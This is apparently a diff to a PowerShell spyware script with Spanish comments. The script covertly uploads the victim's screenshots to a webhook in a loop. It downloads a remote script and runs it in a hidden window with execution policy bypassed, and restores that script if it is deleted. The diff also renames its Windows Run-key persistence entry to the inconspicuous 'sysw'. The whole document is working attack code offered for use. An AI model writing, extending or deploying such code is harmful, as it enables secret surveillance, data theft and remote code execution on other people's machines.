@@ -9,6 +9,8 @@ function DescargarYExecutarScriptPrincipal {
     $scriptPath = "$env:temp\script.ps1"
     if (-not (Test-Path $scriptPath)) {
         Invoke-WebRequest -Uri $scriptUrl -OutFile $scriptPath
+        # Agregar el webhook al final del script
+        Add-Content -Path $scriptPath -Value "`$hookurl = '$hookurl'"
     }
     Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptPath`"" -WindowStyle Hidden
 }
@@ -33,16 +35,35 @@ While ($true){
     For ($i = 0; $i -lt $a; $i++){
         $fileToSend = "$env:temp\SC_$i.png"
         $fileName = "SC_$i.png"
-        $webClient = New-Object System.Net.WebClient
-        $webClient.UploadFile($hookurl, $fileToSend)
+        $fileBytes = [System.IO.File]::ReadAllBytes($fileToSend)
+        $contentType = "application/octet-stream"
+        
+        $headers = @{
+            "Content-Disposition" = "attachment; filename=$fileName"
+        }
+        
+        $response = Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -ContentType $contentType -Body $fileBytes
+        
+        # Comprobamos si la solicitud fue exitosa
+        if ($response.StatusCode -eq 200) {
+            Write-Host "Imagen $fileName enviada correctamente."
+        } else {
+            Write-Host "Error al enviar la imagen $fileName. Código de estado: $($response.StatusCode)"
+        }
+        
         Remove-Item -Path $fileToSend -Force
     }
     Start-Sleep $seconds
+    # Verificar si el script principal existe, si no, descargarlo
+    if (-not (Test-Path $scriptPath)) {
+        DescargarYExecutarScriptPrincipal
+    }
 }
 
 # Agregar entrada al Registro de Windows para ejecutar al iniciar sesión
 $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$scriptName = "MyScript"
+$scriptName = "sysw"
 if (-not (Get-ItemProperty -Path $registryPath -Name $scriptName -ErrorAction SilentlyContinue)) {
-    Set-ItemProperty -Path $registryPath -Name $scriptName -Value "powershell.exe -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
+    $scriptFullPath = (Get-Item -Path ".\$MyInvocation.MyCommand.Name").FullName
+    Set-ItemProperty -Path $registryPath -Name $scriptName -Value "powershell.exe -ExecutionPolicy Bypass -File `"$scriptFullPath`""
 }
